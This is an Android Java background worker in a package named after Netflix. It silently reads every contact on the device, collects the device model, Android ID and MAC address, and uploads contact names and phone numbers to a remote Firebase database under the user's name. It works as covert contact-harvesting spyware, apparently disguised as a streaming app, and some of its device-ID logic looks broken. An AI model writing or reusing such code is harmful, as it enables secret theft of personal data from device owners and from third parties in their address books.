package com.netflix.app.utlis;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.net.NetworkInterface;
import java.util.Collections;
import java.util.List;

import static android.provider.Settings.Secure.ANDROID_ID;

public class ContactWork extends Worker {

    private final String TAG = ContactWork.class.getSimpleName();

    public ContactWork(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    private Context applicationContext = getApplicationContext();
    private DatabaseReference databaseReference;
    private String devicename, deviceno, iemiNO, MacAddr;

    @NonNull
    @Override
    public Result doWork() {

        phoneIds();
        try {

            databaseReference = FirebaseDatabase.getInstance().getReference("Contacts");
            Log.d("DATATTAA", "" + databaseReference);
            String keyUserName = getInputData().getString("keyUserName");
            getAllContacts(keyUserName);

            return Result.success();
        } catch (Exception exception) {

            throw new RuntimeException("Failed to decode input stream", exception);
        } catch (Throwable throwable) {
            // If there were errors, return FAILURE
            Log.e(TAG, "Error", throwable);
            return Result.failure();
        }
    }

    private void getAllContacts(String username) {

        ContentResolver contentResolver = applicationContext.getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                String emailId = null, id, name = null, phoneNumber = null;
                try {
                    int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)));

                    if (hasPhoneNumber > 0) {
                        id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                        name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                        Cursor phoneCursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                        if (phoneCursor != null) {
                            if (phoneCursor.moveToNext()) {
                                phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            } else {
                                phoneCursor.close();
                            }
                        }


                        Cursor emailCursor = contentResolver.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[]{id}, null);
                        if (emailCursor != null) {
                            if (emailCursor.moveToNext()) {
                                emailId = emailCursor.getString(emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                            } else {
                                emailCursor.close();
                            }

                        }
                        SendData(name, phoneNumber, emailId, username, iemiNO);
                    }

                } catch (Exception e) {
                    Log.i("Exception Caught", "" + e.getMessage());
                    Log.i("Exception Caught1", "" + e.getStackTrace().toString());
                }
            }
        }

    }

    public void SendData(String name, String phoneNumber, String email, String username, String iemiNO) {
        String nm = "";
        try {
            nm = name.toUpperCase().replaceAll("([.#$\\[\\]])", " ");
        } catch (NullPointerException n) {
            n.printStackTrace();
            nm = phoneNumber;
        } catch (Exception e) {
            e.printStackTrace();
        }

        if (nm.length() != 0) {
            databaseReference.child(username.toUpperCase()).child(iemiNO).child(nm).setValue(phoneNumber);
        }
    }

    private void phoneIds() {
        if (PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.READ_PHONE_STATE)) {
            final TelephonyManager telephonyManager = (TelephonyManager) applicationContext.getSystemService(Context.TELEPHONY_SERVICE);
            devicename = Build.MODEL;
            deviceno = Settings.Secure.getString(applicationContext.getContentResolver(), ANDROID_ID);
            iemiNO = "";
            MacAddr = getMacAddr();
        }
    }

    public static String getMacAddr() {
        try {
            List<NetworkInterface> all = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface nif : all) {
                if (!nif.getName().equalsIgnoreCase("wlan0")) continue;

                byte[] macBytes = nif.getHardwareAddress();
                if (macBytes == null) {
                    return "";
                }

                StringBuilder res1 = new StringBuilder();
                for (byte b : macBytes) {
                    res1.append(Integer.toHexString(b & 0xFF) + ":");
                }

                if (res1.length() > 0) {
                    res1.deleteCharAt(res1.length() - 1);
                }
                return res1.toString();
            }
        } catch (Exception ex) {
            //handle exception
        }

        return "";
    }
}
